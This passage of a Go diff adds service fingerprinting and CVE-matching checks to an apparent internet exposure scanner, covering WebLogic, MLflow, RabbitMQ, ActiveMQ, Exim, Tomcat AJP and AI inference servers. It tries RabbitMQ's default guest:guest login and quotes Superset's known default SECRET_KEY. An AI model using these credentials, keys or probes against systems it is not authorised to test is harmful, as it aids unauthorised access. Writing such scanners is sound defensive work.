+						"inject rogue access points into the network, and potentially exploit firmware CVEs. "+
+						"Restrict management access to trusted management VLANs.",
+					map[string]any{"port": port, "service": "aruba-instant"},
+				)}
+			}
+		}
+
+	// ── UniFi captive portal / guest portal ───────────────────────────────────
+	case 8880:
+		if findings := probeUniFi(ctx, asset, port, false); len(findings) > 0 {
+			return findings
+		}
+	case 8843:
+		if findings := probeUniFi(ctx, asset, port, true); len(findings) > 0 {
+			return findings
+		}
+
+	// ── TP-Link Omada Network Management ─────────────────────────────────────
+	case 8043:
+		if findings := probeTPLinkOmada(ctx, asset, port, true); len(findings) > 0 {
+			return findings
+		}
+
+	// ── Aruba Instant access point management ─────────────────────────────────
+	case 4343:
+		if body, ok := probeHTTPBody(ctx, asset, port, true, "/"); ok {
+			lb := strings.ToLower(body)
+			if strings.Contains(lb, "aruba") || strings.Contains(lb, "instant ap") {
+				return []finding.Finding{makeF(
+					finding.CheckNetDeviceArubaInstant,
+					finding.SeverityHigh,
+					fmt.Sprintf("Aruba Instant access point management UI exposed on port %d", port),
+					"An Aruba Instant access point web management interface is accessible from the internet. "+
+						"Exposed AP management allows attackers to reconfigure WiFi SSIDs, capture credentials, "+
+						"inject rogue access points into the network, and potentially exploit firmware CVEs. "+
+						"Restrict management access to trusted management VLANs.",
+					map[string]any{"port": port, "service": "aruba-instant"},
+				)}
+			}
+		}
+
+	// ── Oracle WebLogic Server ────────────────────────────────────────────────
+	// Exposedfiles handles the full CVE probe suite; portscan emits an exposure
+	// finding when it confirms WebLogic is listening on 7001.
+	case 7001:
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/console/login/LoginForm.jsp"); ok {
+			lb := strings.ToLower(body)
+			if strings.Contains(lb, "weblogic") || strings.Contains(lb, "oracle") {
+				return []finding.Finding{makeF(
+					finding.CheckCVEWebLogicConsole,
+					finding.SeverityCritical,
+					fmt.Sprintf("Oracle WebLogic admin console exposed on port %d (CVE-2020-14882 KEV)", port),
+					"Oracle WebLogic admin console at /console/login/LoginForm.jsp is internet-accessible. "+
+						"CVE-2020-14882/14883 (CVSS 9.8, KEV) allows unauthenticated RCE via double URL-encoded "+
+						"paths. The WebLogic admin console must never be internet-facing regardless of patch level.",
+					map[string]any{"port": port, "service": "weblogic"},
+				)}
+			}
+		}
+
+	// ── Neo4j graph database HTTP API ─────────────────────────────────────────
+	case 7474:
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/"); ok {
+			lb := strings.ToLower(body)
+			if strings.Contains(lb, "neo4j") || (strings.Contains(lb, "bolt") && strings.Contains(lb, "transaction")) {
+				return []finding.Finding{makeF(
+					finding.CheckPortNeo4jExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("Neo4j graph database HTTP API exposed without authentication on port %d", port),
+					"A Neo4j graph database REST API is accessible without authentication on port 7474. "+
+						"Unauthenticated access allows full read/write of all graph data. "+
+						"Enable authentication in neo4j.conf (dbms.security.auth_enabled=true) and "+
+						"restrict port 7474 to application server subnets only.",
+					map[string]any{"port": port, "service": "neo4j"},
+				)}
+			}
+		}
+
+	// ── Gradio ML demo server / Automatic1111 SD WebUI ───────────────────────
 	case 7860:
 		if body, ok := probeHTTPBody(ctx, asset, port, false, "/info"); ok && strings.Contains(body, "gradio") {
 			return []finding.Finding{makeF(
@@ -1188,6 +1685,26 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 					"SSRF, prompt injection, or unauthorized model access.",
 				map[string]any{"port": port, "service": service, "banner": banner},
 			)}
+		}
+		// Automatic1111 Stable Diffusion WebUI also runs on 7860 by default.
+		// GET /sdapi/v1/options returns model paths and all SD config without auth.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/sdapi/v1/options"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "sd_model_checkpoint") || strings.Contains(bodyLow, "stable_diffusion") ||
+				strings.Contains(bodyLow, "sdapi") || strings.Contains(bodyLow, "samples_format") {
+				return []finding.Finding{makeF(
+					finding.CheckPortAutomatic1111Exposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("Automatic1111 Stable Diffusion WebUI exposed unauthenticated on port %d", port),
+					"An Automatic1111 Stable Diffusion WebUI instance is publicly accessible without authentication. "+
+						"The /sdapi/v1/options endpoint discloses model paths, output directories, and all SD configuration. "+
+						"Unauthenticated access allows arbitrary image generation at the operator's compute cost, "+
+						"model file path disclosure (aiding local file read attacks), and SSRF via "+
+						"the extensions system. Enable authentication (--gradio-auth) and restrict to trusted networks.",
+					map[string]any{"port": port, "service": "automatic1111",
+						"url": fmt.Sprintf("http://%s:%d/sdapi/v1/options", asset, port)},
+				)}
+			}
 		}
 
 	// ── Webmin ────────────────────────────────────────────────────────────────
@@ -1219,6 +1736,462 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 		}
 
 	// ── Veeam Backup & Replication ────────────────────────────────────────────
+	// ── Apache Superset BI platform ──────────────────────────────────────────
+
+	case 8088:
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/api/v1/"); ok {
+			lower := strings.ToLower(body)
+			if strings.Contains(lower, "superset") || strings.Contains(lower, "apache") {
+				ev := map[string]any{"port": port, "service": service}
+				// Extract version from {"version":"X.Y.Z",...} JSON field.
+				if ver := parseJSONStringField(body, "version"); ver != "" {
+					ev["superset_version"] = ver
+				}
+				// CVE-2023-27524 (CVSS 8.9): default SECRET_KEY allows session forge.
+				// Known default: '\x02\x01thisismyscretkey\x01\x02\xe2\xe1\xd5\xd0'
+				// No patched version test here — exposure itself is the signal.
+				return []finding.Finding{makeF(
+					finding.CheckPortSupersetExposed,
+					finding.SeverityCritical,
+					fmt.Sprintf("Apache Superset BI platform exposed on port %d", port),
+					"Apache Superset is publicly accessible. CVE-2023-27524 (CVSS 8.9, EPSS 84%) allows "+
+						"session cookie forgery when the default SECRET_KEY is not changed, granting admin "+
+						"access to all dashboards and database credentials. Superset stores production database "+
+						"connection strings. Restrict to trusted networks and rotate the SECRET_KEY.",
+					ev,
+				)}
+			}
+		}
+
+	// ── MLflow experiment tracking server ──────────────────────────────────────
+
+	case 5000:
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/ping"); ok &&
+			strings.Contains(strings.ToLower(body), "ready") {
+			ev := map[string]any{"port": port, "service": service}
+			// Version from GET /version returns plain-text version string.
+			if verBody, ok2 := probeHTTPBody(ctx, asset, port, false, "/version"); ok2 {
+				ver := strings.TrimSpace(verBody)
+				if ver != "" && !strings.ContainsAny(ver, "<>{") {
+					ev["mlflow_version"] = ver
+				}
+			}
+			findings := []finding.Finding{makeF(
+				finding.CheckPortMLflowExposed,
+				finding.SeverityCritical,
+				fmt.Sprintf("MLflow experiment tracking server exposed on port %d", port),
+				"An MLflow server is publicly accessible without authentication. MLflow stores "+
+					"model artifacts, experiment parameters, training metrics, and run data. "+
+					"CVE-2023-6014 (CVSS 9.1) allows unauthenticated account creation via POST "+
+					"/api/2.0/users/create on MLflow < 2.8.0. Restrict to trusted networks.",
+				ev,
+			)}
+			// CVE-2023-6014: check if account creation API is open.
+			if probeHTTP(ctx, asset, port, false, "/api/2.0/mlflow/experiments/list") {
+				findings = append(findings, makeF(
+					finding.CheckCVEMLflowAuthBypass,
+					finding.SeverityCritical,
+					fmt.Sprintf("CVE-2023-6014: MLflow unauthenticated REST API confirmed on port %d", port),
+					"The MLflow experiments list API (/api/2.0/mlflow/experiments/list) returns data "+
+						"without authentication. CVE-2023-6014 (CVSS 9.1) allows unauthenticated account "+
+						"creation on MLflow < 2.8.0. Upgrade MLflow and restrict network access.",
+					ev,
+				))
+			}
+			return findings
+		}
+
+	// ── Ray distributed ML dashboard ──────────────────────────────────────────
+
+	case 8265:
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/api/version"); ok {
+			ev := map[string]any{"port": port, "service": service}
+			if ver := parseJSONStringField(body, "version"); ver != "" {
+				ev["ray_version"] = ver
+			}
+			if strings.Contains(strings.ToLower(body), "ray") || strings.Contains(body, "version") {
+				return []finding.Finding{makeF(
+					finding.CheckPortRayDashboardExposed,
+					finding.SeverityCritical,
+					fmt.Sprintf("Ray distributed ML dashboard exposed on port %d", port),
+					"The Ray distributed computing dashboard is publicly accessible without authentication. "+
+						"Ray Dashboard exposes cluster state, running jobs, actor information, and "+
+						"file system paths. CVE-2026-32981 allows path traversal for arbitrary file reads. "+
+						"The jobs API (/api/jobs/) allows submitting and canceling cluster jobs without auth. "+
+						"Restrict to trusted networks immediately.",
+					ev,
+				)}
+			}
+		}
+
+	// ── NATS message broker monitoring ───────────────────────────────────────
+
+	case 8222:
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/varz"); ok {
+			ev := map[string]any{"port": port, "service": service}
+			if ver := parseJSONStringField(body, "version"); ver != "" {
+				ev["nats_version"] = ver
+			}
+			if strings.Contains(body, "server_id") || strings.Contains(body, "nats") {
+				return []finding.Finding{makeF(
+					finding.CheckPortNATSMonitoringExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("NATS message broker monitoring API exposed on port %d", port),
+					"The NATS server monitoring endpoint (/varz) is publicly accessible. "+
+						"This exposes server configuration, connection counts, subscription counts, "+
+						"and routing topology. Multiple NATS CVEs involve authentication bypass: "+
+						"CVE-2023-47090 (system account bypass), CVE-2022-24450 (authorization bypass), "+
+						"CVE-2026-27889 (pre-auth crash via WebSocket). "+
+						"Restrict the monitoring port to trusted networks.",
+					ev,
+				)}
+			}
+		}
+
+	// ── ClickHouse analytics database HTTP interface ──────────────────────────
+
+	case 8123:
+		// ClickHouse HTTP interface uniquely returns "Ok.\n" to GET /.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/"); ok &&
+			strings.TrimSpace(body) == "Ok." {
+			ev := map[string]any{"port": port, "service": service}
+			// Version available via SELECT version() query.
+			if verBody, ok2 := probeHTTPBody(ctx, asset, port, false,
+				"/?query=SELECT+version()"); ok2 {
+				ver := strings.TrimSpace(verBody)
+				if ver != "" && !strings.ContainsAny(ver, "<>{") {
+					ev["clickhouse_version"] = ver
+				}
+			}
+			return []finding.Finding{makeF(
+				finding.CheckPortClickHouseExposed,
+				finding.SeverityHigh,
+				fmt.Sprintf("ClickHouse analytics database HTTP interface exposed on port %d", port),
+				"The ClickHouse HTTP interface is publicly accessible. In default configuration, "+
+					"ClickHouse allows unauthenticated read access via the HTTP API. "+
+					"CVE-2018-14668 (CVSS 7.5) and CVE-2018-14669 (CVSS 9.1) allow arbitrary file "+
+					"reads and unauthorized network access on older versions. Restrict to trusted networks "+
+					"and enable authentication (user/password) in the ClickHouse configuration.",
+					ev,
+			)}
+		}
+
+	// ── RabbitMQ management API ───────────────────────────────────────────────
+
+	case 15672:
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "rabbitmq") {
+				ev := map[string]any{"port": port, "service": service}
+				return []finding.Finding{makeF(
+					finding.CheckPortRabbitMQMgmtExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("RabbitMQ management API exposed on port %d", port),
+					"The RabbitMQ management UI and REST API are publicly accessible. "+
+						"The management API provides full control over virtual hosts, exchanges, "+
+						"queues, bindings, and user accounts. Default credentials (guest:guest) "+
+						"are disabled on non-localhost connections in recent versions but older "+
+						"deployments may still accept them. Restrict to trusted networks.",
+					ev,
+				)}
+			}
+		}
+		// Test for default guest:guest credentials on the RabbitMQ management API.
+		if body, ok := probeHTTPBodyWithAuth(ctx, asset, port, false, "/api/overview", "guest", "guest"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "rabbitmq_version") || strings.Contains(bodyLow, "cluster_name") {
+				return []finding.Finding{makeF(
+					finding.CheckPortRabbitMQDefaultCreds,
+					finding.SeverityCritical,
+					fmt.Sprintf("RabbitMQ accepts default guest:guest credentials on port %d", port),
+					"The RabbitMQ management API accepts the factory-default credentials guest:guest. "+
+						"An attacker can read all messages in transit, publish arbitrary messages, delete queues, "+
+						"reconfigure exchanges and virtual hosts, and manage user accounts. "+
+						"Delete the guest account and create named service accounts with minimal permissions.",
+					map[string]any{"port": port, "service": service, "creds": "guest:guest", "authenticated": true},
+				)}
+			}
+		}
+
+	// ── Tekton Pipelines dashboard ────────────────────────────────────────────
+
+	case 9097:
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "tekton") {
+				ev := map[string]any{"port": port, "service": service}
+				return []finding.Finding{makeF(
+					finding.CheckPortTektonDashboardExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("Tekton Pipelines dashboard exposed on port %d", port),
+					"The Tekton CI/CD Pipelines dashboard is publicly accessible without authentication. "+
+						"Tekton Dashboard exposes pipeline runs, task runs, and cluster configuration. "+
+						"CVE-2026-33211 allows path traversal in the git resolver to read arbitrary files "+
+						"from the resolver pod. Restrict to trusted networks and configure auth.",
+					ev,
+				)}
+			}
+		}
+
+	case 8080:
+		// LocalAI OpenAI-compatible inference server — no auth by default.
+		// Detection: /v1/models returns JSON with "owned_by":"localai" or "Local AI" body substring.
+		if lbody, lok := probeHTTPBody(ctx, asset, port, false, "/v1/models"); lok {
+			bodyLow := strings.ToLower(lbody)
+			if strings.Contains(bodyLow, "localai") || strings.Contains(bodyLow, "local ai") ||
+				strings.Contains(bodyLow, "go-skynet") {
+				return []finding.Finding{makeF(
+					finding.CheckPortLocalAIExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("LocalAI inference server exposed unauthenticated on port %d", port),
+					"A LocalAI OpenAI-compatible LLM inference server is publicly accessible without authentication. "+
+						"LocalAI serves language models, image generation, and audio transcription locally. "+
+						"Unauthenticated access allows unlimited inference at the operator's cost, "+
+						"exposure of locally loaded models, and potential arbitrary model file access. "+
+						"Configure authentication and restrict access to trusted networks.",
+					map[string]any{"port": port, "service": "localai",
+						"url": fmt.Sprintf("http://%s:%d/v1/models", asset, port)},
+				)}
+			}
+		}
+		// Apache Pulsar admin API — GET /admin/v2/clusters returns JSON listing broker clusters.
+		// The Pulsar admin API has no authentication by default and provides full cluster control:
+		// create/delete topics, manage namespaces, drain brokers, and read all messages.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/admin/v2/clusters"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "standalone") || strings.Contains(bodyLow, "pulsar") ||
+				(strings.HasPrefix(strings.TrimSpace(body), "[") && strings.Contains(body, `"`)) {
+				return []finding.Finding{makeF(
+					finding.CheckPortPulsarAdminExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("Apache Pulsar admin API exposed unauthenticated on port %d", port),
+					"The Apache Pulsar broker admin REST API at /admin/v2/clusters is accessible without "+
+						"authentication. The Pulsar admin API provides full control over the messaging cluster: "+
+						"creating and deleting topics and namespaces, managing subscriptions, offloading data, "+
+						"and reading broker configuration. Unauthenticated access can expose all topic data "+
+						"and allow a attacker to drain, corrupt, or delete message queues. "+
+						"Enable Pulsar authentication (JWT or TLS mutual auth) and restrict the admin port "+
+						"to trusted management networks.",
+					map[string]any{"port": port, "service": service,
+						"url": fmt.Sprintf("http://%s:%d/admin/v2/clusters", asset, port)},
+				)}
+			}
+		}
+		// Apache NiFi — GET /nifi/ redirects or returns the NiFi UI without auth in older versions.
+		// NiFi provides full data flow control (source connectors, processors, destinations).
+		// Unauthenticated access allows reading all flow data and modifying pipeline routing.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/nifi/"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "nifi") || strings.Contains(bodyLow, "apache nifi") {
+				return []finding.Finding{makeF(
+					finding.CheckPortNiFiExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("Apache NiFi data pipeline UI accessible on port %d", port),
+					"An Apache NiFi data pipeline instance is publicly accessible. "+
+						"NiFi provides a web-based interface for designing, controlling, and monitoring data flows. "+
+						"Unauthenticated access (or default credentials) allows full control over data routing, "+
+						"reading all data in transit, modifying processor configurations, and connecting "+
+						"to internal data sources. Enable NiFi authentication and restrict to trusted networks.",
+					map[string]any{"port": port, "service": "nifi",
+						"url": fmt.Sprintf("http://%s:%d/nifi/", asset, port)},
+				)}
+			}
+		}
+
+	case 3000:
+		// AdGuard Home admin UI — GET /control/status returns JSON with DNS state.
+		// AdGuard Home is a network-wide DNS sinkhole. Unauthenticated access to the
+		// admin UI allows an attacker to reconfigure DNS upstream servers (DNS hijack),
+		// disable filtering, or establish a persistent backdoor on all network clients.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/control/status"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "dns_addresses") || (strings.Contains(bodyLow, "running") &&
+				strings.Contains(bodyLow, "version")) {
+				return []finding.Finding{makeF(
+					finding.CheckPortAdGuardExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("AdGuard Home admin UI exposed unauthenticated on port %d", port),
+					"The AdGuard Home admin API at /control/status is accessible without authentication. "+
+						"AdGuard Home controls DNS resolution for all devices on the network. "+
+						"Unauthenticated access allows an attacker to reconfigure upstream DNS servers "+
+						"(enabling DNS hijacking of the entire network), disable ad/malware filtering, "+
+						"read DNS query logs, and modify access control lists. "+
+						"Enable authentication in AdGuard Home settings and restrict access to the "+
+						"admin interface to trusted internal addresses only.",
+					map[string]any{"port": port, "service": service,
+						"url": fmt.Sprintf("http://%s:%d/control/status", asset, port)},
+				)}
+			}
+		}
+
+		// HuggingFace Text Generation Inference (TGI) — probe /info for model_id disclosure.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/info"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "model_id") && strings.Contains(bodyLow, "max_input_length") {
+				return []finding.Finding{makeF(
+					finding.CheckPortHuggingFaceTGIExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("HuggingFace Text Generation Inference server exposed unauthenticated on port %d", port),
+					"A HuggingFace Text Generation Inference (TGI) server is publicly accessible without authentication. "+
+						"The /info endpoint discloses the loaded model ID, maximum input/output lengths, and server configuration. "+
+						"Unauthenticated access allows unlimited LLM inference at the operator's compute cost, "+
+						"model identification for targeted attacks, and potential prompt injection against downstream applications. "+
+						"Add authentication via a reverse proxy and restrict the port to trusted networks.",
+					map[string]any{"port": port, "service": "huggingface-tgi",
+						"url": fmt.Sprintf("http://%s:%d/info", asset, port)},
+				)}
+			}
+		}
+
+	case 30000:
+		// SGLang LLM inference server — GET /health confirms the service;
+		// GET /v1/models lists available models. SGLang has no authentication by default.
+		// Unauthenticated access allows arbitrary LLM inference at the operator's cost
+		// and may expose fine-tuned model weights or training data via the API.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/v1/models"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "data") && strings.Contains(bodyLow, "model") {
+				return []finding.Finding{makeF(
+					finding.CheckPortSGLangExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("SGLang LLM inference server exposed unauthenticated on port %d", port),
+					"An SGLang LLM inference server is publicly accessible without authentication. "+
+						"SGLang is a high-throughput serving framework for large language models. "+
+						"Unauthenticated access allows unlimited inference at the operator's infrastructure cost, "+
+						"potential prompt injection attacks, and exposure of fine-tuned model capabilities "+
+						"or system prompts. If fine-tuned on proprietary data, model inversion may be possible. "+
+						"Add an API key requirement (--api-key) and place the inference server behind "+
+						"an authenticated reverse proxy or VPN.",
+					map[string]any{"port": port, "service": service,
+						"url": fmt.Sprintf("http://%s:%d/v1/models", asset, port)},
+				)}
+			}
+		}
+
+	case 8009:
+		// CVE-2020-1938 (Tomcat GhostCat, CVSS 9.8, KEV): the AJP connector on port 8009
+		// allows reading arbitrary files from the Tomcat webapp root and, when combined with
+		// file upload, achieves unauthenticated RCE. AJP is an internal protocol that should
+		// never be internet-facing. The port being open is itself the finding.
+		return []finding.Finding{makeF(
+			finding.CheckCVETomcatGhostCat,
+			finding.SeverityCritical,
+			fmt.Sprintf("CVE-2020-1938: Tomcat AJP connector exposed on port %d (GhostCat)", port),
+			"The Apache Tomcat AJP (Apache JServ Protocol) connector is publicly accessible on port 8009. "+
+				"CVE-2020-1938 (CVSS 9.8, KEV, GhostCat) allows an unauthenticated attacker to read any "+
+				"file from the Tomcat webapp directory. When file upload is possible, this escalates to "+
+				"unauthenticated remote code execution. AJP is an internal connector protocol designed "+
+				"for communication between Tomcat and a front-end web server (Apache httpd) — it must "+
+				"never be exposed to the internet. Disable the AJP connector in server.xml "+
+				"(comment out or delete the Connector port=\"8009\" element) and apply all Tomcat patches.",
+			map[string]any{"port": port, "service": "ajp", "protocol": "AJP/1.3"},
+		)}
+
+	case 8188:
+		// ComfyUI (Stable Diffusion) — no auth by default.
+		// GET /system_stats returns GPU/VRAM info; GET /object_info lists all nodes.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/system_stats"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "vram") || strings.Contains(bodyLow, "ram_total") ||
+				strings.Contains(bodyLow, "comfyui") {
+				return []finding.Finding{makeF(
+					finding.CheckPortComfyUIExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("ComfyUI Stable Diffusion server exposed unauthenticated on port %d", port),
+					"A ComfyUI image generation server is publicly accessible without authentication. "+
+						"ComfyUI is a node-based Stable Diffusion UI with full filesystem access for "+
+						"model loading. Unauthenticated access allows arbitrary image generation, "+
+						"reading model files via the /view endpoint (arbitrary file read traversal), "+
+						"and potentially executing custom nodes with OS-level access. "+
+						"Add authentication (--auth user:pass) and restrict to trusted networks.",
+					map[string]any{"port": port, "service": "comfyui",
+						"url": fmt.Sprintf("http://%s:%d/system_stats", asset, port)},
+				)}
+			}
+		}
+
+	case 8006:
+		// Proxmox VE hypervisor management — exposed admin UI.
+		// GET /api2/json/version returns version info unauthenticated (informational endpoint).
+		// The management UI itself requires auth but default creds (root:proxmox) are common.
+		if body, ok := probeHTTPBody(ctx, asset, port, true, "/api2/json/version"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "version") && strings.Contains(bodyLow, "release") {
+				return []finding.Finding{makeF(
+					finding.CheckPortProxmoxExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("Proxmox VE hypervisor management UI exposed on port %d", port),
+					"The Proxmox VE hypervisor management interface is publicly accessible. "+
+						"Proxmox VE controls virtual machines, containers, storage, and networking "+
+						"for the entire hypervisor. Default credentials (root:proxmox) or weak "+
+						"passwords combined with internet exposure create critical infrastructure risk. "+
+						"Proxmox management should be restricted to dedicated management VLANs "+
+						"accessible only via VPN. Enable 2FA and change default credentials immediately.",
+					map[string]any{"port": port, "service": "proxmox",
+						"url": fmt.Sprintf("https://%s:%d", asset, port)},
+				)}
+			}
+		}
+
+	case 19999:
+		// Netdata real-time monitoring — older versions have no auth by default.
+		// GET /api/v1/info returns hostname, OS, CPU, memory, disk info unauthenticated.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/api/v1/info"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "netdata") || strings.Contains(bodyLow, "hostname") &&
+				strings.Contains(bodyLow, "os_name") {
+				return []finding.Finding{makeF(
+					finding.CheckPortNetdataExposed,
+					finding.SeverityMedium,
+					fmt.Sprintf("Netdata monitoring dashboard exposed unauthenticated on port %d", port),
+					"A Netdata real-time monitoring dashboard is publicly accessible without authentication. "+
+						"Netdata exposes detailed system metrics: CPU, memory, disk, network, running processes, "+
+						"Docker containers, and application internals. This information significantly aids "+
+						"reconnaissance for targeted attacks. Older Netdata versions allow unauthenticated "+
+						"dashboard access by default. Enable Netdata Cloud authentication or place Netdata "+
+						"behind an authenticated reverse proxy restricted to monitoring networks.",
+					map[string]any{"port": port, "service": "netdata",
+						"url": fmt.Sprintf("http://%s:%d", asset, port)},
+				)}
+			}
+		}
+
+	case 61616:
+		// CVE-2023-46604 (Apache ActiveMQ, CVSS 10.0, KEV): ClassInfo deserialization via
+		// the OpenWire protocol allows unauthenticated RCE. The broker banner on port 61616
+		// exposes the ActiveMQ version string. Vulnerable: < 5.15.16, 5.16.x < 5.16.7,
+		// 5.17.x < 5.17.6, 5.18.x < 5.18.3.
+		// The ActiveMQ banner is binary but contains the version string as a substring.
+		if strings.Contains(banner, "ActiveMQ") || strings.Contains(banner, "activemq") {
+			vuln, verStr := isActiveMQRCE2023Vulnerable(banner)
+			if vuln {
+				return []finding.Finding{makeF(
+					finding.CheckCVEActiveMQRCE,
+					finding.SeverityCritical,
+					fmt.Sprintf("CVE-2023-46604: Apache ActiveMQ %s vulnerable to pre-auth RCE on port %d", verStr, port),
+					fmt.Sprintf("Apache ActiveMQ %s is internet-accessible and vulnerable to CVE-2023-46604 "+
+						"(CVSS 10.0, KEV). The ClassInfo deserialization vulnerability in the OpenWire "+
+						"protocol allows an unauthenticated remote attacker to execute arbitrary code. "+
+						"Exploited by HelloKitty ransomware and multiple APT groups. "+
+						"Upgrade to ActiveMQ 5.15.16+, 5.16.7+, 5.17.6+, or 5.18.3+ immediately. "+
+						"Restrict port 61616 to internal broker networks only.", verStr),
+					map[string]any{"port": port, "service": "activemq", "banner": banner, "version": verStr},
+				)}
+			}
+			// ActiveMQ detected but version not determined or not vulnerable — still report exposure.
+			return []finding.Finding{makeF(
+				finding.CheckPortActiveMQExposed,
+				finding.SeverityHigh,
+				fmt.Sprintf("Apache ActiveMQ broker exposed on port %d", port),
+				"An Apache ActiveMQ message broker is publicly accessible. The OpenWire protocol "+
+					"(port 61616) is the primary broker protocol and should be restricted to "+
+					"trusted application networks. Multiple critical CVEs affect ActiveMQ brokers "+
+					"including CVE-2023-46604 (CVSS 10.0, RCE). Verify the version and patch level, "+
+					"and restrict port 61616 to internal networks immediately.",
+				map[string]any{"port": port, "service": "activemq", "banner": banner},
+			)}
+		}
+
 	case 9401, 9419:
 		portDesc := map[int]string{
 			9401: "Veeam Backup & Replication Enterprise Manager",
@@ -1257,30 +2230,65 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 		// Banner grab is already done above; parse for software/version.
 		// Any internet-facing SMTP port warrants a finding.
 		if banner != "" {
-			var f finding.Finding
 			lbanner := strings.ToLower(banner)
-			switch {
-			case strings.Contains(lbanner, "exim"):
-				f = makeF(
+			if strings.Contains(lbanner, "exim") {
+				eximVer := parseEximVersion(banner)
+				ev := map[string]any{"port": port, "service": service, "banner": banner, "exim_version": eximVer}
+
+				// CVE-2018-6789: Exim < 4.90.1 base64d() off-by-one heap overflow → pre-auth RCE (KEV).
+				// The base64 decode buffer is undersized by 1 byte for inputs of length 4n+3,
+				// overwriting the next heap chunk's metadata and enabling arbitrary write.
+				if eximVer != "" && isEximHeapOverflowVulnerable(eximVer) {
+					return []finding.Finding{makeF(
+						finding.CheckCVEEximHeapOverflow,
+						finding.SeverityCritical,
+						fmt.Sprintf("CVE-2018-6789: Exim %s vulnerable to pre-auth heap overflow RCE on port %d", eximVer, port),
+						fmt.Sprintf("Exim %s is internet-accessible and vulnerable to CVE-2018-6789 (CVSS 9.8, KEV). "+
+							"A one-byte heap overflow in the base64d() decoder allows an unauthenticated remote attacker "+
+							"to corrupt heap metadata and achieve arbitrary write, leading to remote code execution "+
+							"as the Exim daemon user. All Exim versions before 4.90.1 are affected. "+
+							"Exploited by multiple botnets. Upgrade to Exim 4.90.1 or later immediately.", eximVer),
+						ev,
+					)}
+				}
+
+				// CVE-2019-10149: Exim 4.87–4.91 local-part expansion RCE (KEV).
+				// The DELIVER_FAIL_STR expansion uses an unchecked snprintf replacement
+				// that evaluates ${run{...}} in the local-part — full RCE without auth.
+				if eximVer != "" && isEximRCE2019Vulnerable(eximVer) {
+					return []finding.Finding{makeF(
+						finding.CheckCVEEximRCE2019,
+						finding.SeverityCritical,
+						fmt.Sprintf("CVE-2019-10149: Exim %s vulnerable to unauthenticated RCE on port %d", eximVer, port),
+						fmt.Sprintf("Exim %s is internet-accessible and vulnerable to CVE-2019-10149 (CVSS 9.8, KEV). "+
+							"The DELIVER_FAIL_STR expansion in Exim 4.87–4.91 allows a remote attacker to execute "+
+							"arbitrary OS commands by crafting a malicious local part in the RCPT TO address. "+
+							"The vulnerability is exploited by sending a specially-crafted bounce message. "+
+							"Exploited by the Gitpaste-12 botnet and multiple threat actors. "+
+							"Upgrade to Exim 4.92 or later immediately.", eximVer),
+						ev,
+					)}
+				}
+
+				// CVE-2025-26794: Exim 4.98 < 4.98.1 SQL injection via ETRN (CVSS 9.8).
+				return []finding.Finding{makeF(
 					finding.CheckPortExImVulnerable,
 					finding.SeverityCritical,
-					fmt.Sprintf("Exim MTA exposed on port %d — check for CVE-2025-26794", port),
+					fmt.Sprintf("Exim MTA exposed on port %d — verify CVE-2025-26794 (4.98 < 4.98.1)", port),
 					"Exim SMTP server is internet-accessible. CVE-2025-26794 (CVSS 9.8) is an unauthenticated SQL injection "+
 						"in Exim 4.98 before 4.98.1 via the ETRN serialization path. Verify version from banner and update immediately.",
-					map[string]any{"port": port, "service": service, "banner": banner},
-				)
-			default:
-				f = makeF(
-					finding.CheckPortSMTPExposed,
-					finding.SeverityMedium,
-					fmt.Sprintf("SMTP server exposed on port %d", port),
-					"An SMTP server is publicly accessible. The banner may reveal internal hostnames, MTA software, and version. "+
-						"Internet-facing SMTP is expected for mail delivery (port 25) but should be version-hardened. "+
-						"Submission port 587 should require authentication (AUTH PLAIN/LOGIN over TLS only).",
-					map[string]any{"port": port, "service": service, "banner": banner},
-				)
+					ev,
+				)}
 			}
-			return []finding.Finding{f}
+			return []finding.Finding{makeF(
+				finding.CheckPortSMTPExposed,
+				finding.SeverityMedium,
+				fmt.Sprintf("SMTP server exposed on port %d", port),
